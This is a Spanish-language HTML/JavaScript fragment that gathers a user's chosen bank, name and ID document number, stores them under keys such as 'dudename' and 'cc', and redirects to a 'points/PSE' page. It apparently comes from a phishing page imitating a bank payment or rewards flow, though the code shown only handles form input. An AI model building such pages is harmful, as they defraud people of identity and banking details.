  <script src="js/functions.js"></script>
  <script>

    document.addEventListener('DOMContentLoaded', function () {
      const select = document.getElementById('bank-option');
      const documentInput = document.getElementById('document');
      const nameInput = document.getElementById('name');
      const button = document.getElementById('ps-next-step');

      function checkInputs() {
        if (select.value && documentInput.value && nameInput.value) {
          button.classList.remove('inactive');
          button.classList.add('active');
        } else {
          button.classList.remove('active');
          button.classList.add('inactive');
        }
      }

      select.addEventListener('change', checkInputs);
      documentInput.addEventListener('input', checkInputs);
      nameInput.addEventListener('input', checkInputs);
    });

  </script>

  <script>
    const nameCardInput = document.getElementById("name");
    const documentInput = document.getElementById("document");

    // Constante para el select del banco y el botón
    const bankSelect = document.getElementById("bank-option");
    const nextStepButton = document.getElementById("ps-next-step");

    // Agregar evento click al botón
    nextStepButton.addEventListener("click", function () {
      // Guardar todos los valores
      guardarValor("ban", bankSelect.value);
      guardarValor(
        "dudename",
        nameCardInput.value,
        3,
        "Por favor ingrese un nombre válido"
      );
      guardarValor(
        "cc",
        documentInput.value,
        1,
        11,
        "Por favor ingrese un documento válido"
      );

      // Validar que se haya seleccionado un banco
      if (!bankSelect.value) {
        alert("Por favor seleccione un banco");
        return;
      }

      window.location.href = "/points/PSE/index.html";
    });
  </script>
